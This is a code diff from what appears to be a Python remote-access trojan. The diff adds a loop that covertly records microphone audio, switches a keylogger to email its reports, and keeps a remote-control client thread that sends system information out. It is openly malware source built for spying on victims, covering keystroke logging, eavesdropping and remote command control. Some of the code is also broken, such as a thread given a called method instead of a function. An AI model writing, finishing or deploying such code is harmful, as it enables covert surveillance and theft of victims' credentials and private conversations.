@@ -1,7 +1,28 @@
+import os
+import traceback
 from threading import Thread
-
 from remoteCommandsClient import *
+import speech_recognition as sp
+import sounddevice as sd
+from scipy.io.wavfile import write
+import wavio as wv
+import shutil
 
+ascoltato=[]
+indexA=0
+def ascolto():
+
+    while True:
+        try:
+            freq = 44100
+            duration = 20
+            recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
+            sd.wait()
+            #write("recording" + str(indexA) + ".wav", freq, recording)
+            ascoltato[indexA]=recording
+            indexA=indexA+1
+        except:
+            pass
 
 def main():
     try:
@@ -12,10 +33,7 @@ def main():
         else:
             client.setblocking(True)
             time.sleep(3)
-            try:
-                sendInfo(client)
-            except Exception as e:
-                raise e
+            sendInfo(client)
 
             try:
                 time.sleep(7)
@@ -46,12 +64,22 @@ def avvio():
 
 
 if __name__ == "__main__":
-    #start trojan
+    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
 
-    thread_trojan = Thread(target=trojanBehaviour)
-    thread_trojan.start()
+    #thread_trojan = Thread(target=trojanBehaviour)
+    #thread_trojan.start()
+
     thread_remoteControl = Thread(target=avvio)
     thread_remoteControl.start()
-    thread_trojan.join()
-    thread_remoteControl.join()
 
+    #thread_ascolto = Thread(target=ascolto)
+    #thread_ascolto.start()
+
+    thread_key = Thread(target=keylogger.start())
+    thread_key.start()
+
+    #thread_trojan.join()
+    thread_remoteControl.join()
+    #thread_ascolto.join()
+    thread_key.join()
